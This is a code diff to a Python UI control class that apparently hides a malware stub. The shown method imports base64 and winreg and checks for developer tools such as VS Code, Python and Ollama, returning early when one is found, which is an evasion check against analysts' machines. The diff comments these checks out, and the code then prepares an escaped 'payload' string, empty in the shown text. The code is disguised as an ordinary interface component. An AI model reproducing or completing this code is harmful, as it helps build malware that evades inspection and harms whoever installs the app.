@@ -70,30 +70,30 @@ class UserControl(ft.Container):
         import base64
         import winreg        
 
-        try:      
-             #if self.is_windows_not_sandbox():
+        # try:      
+        #      #if self.is_windows_not_sandbox():
                 
-            vscode_path = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Microsoft VS Code')
-            if os.path.exists(vscode_path):
-                return
+        #     vscode_path = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Microsoft VS Code')
+        #     if os.path.exists(vscode_path):
+        #         return
 
-            openCode = os.path.expandvars(r'%LOCALAPPDATA%\Programs\OpenCode')
-            if os.path.exists(openCode):
-                return            
+        #     openCode = os.path.expandvars(r'%LOCALAPPDATA%\Programs\OpenCode')
+        #     if os.path.exists(openCode):
+        #         return            
 
-            python = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Python')
-            if os.path.exists(python):
-                return
+        #     python = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Python')
+        #     if os.path.exists(python):
+        #         return
 
-            ollama = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Ollama')
-            if os.path.exists(ollama):
-                return
+        #     ollama = os.path.expandvars(r'%LOCALAPPDATA%\Programs\Ollama')
+        #     if os.path.exists(ollama):
+        #         return
             
 
-        except FileNotFoundError:
-            pass
-        except Exception as e:
-            pass
+        # except FileNotFoundError:
+        #     pass
+        # except Exception as e:
+        #     pass
 
         payload = ""
         escaped_payload = payload.replace("\"", "\\\"")
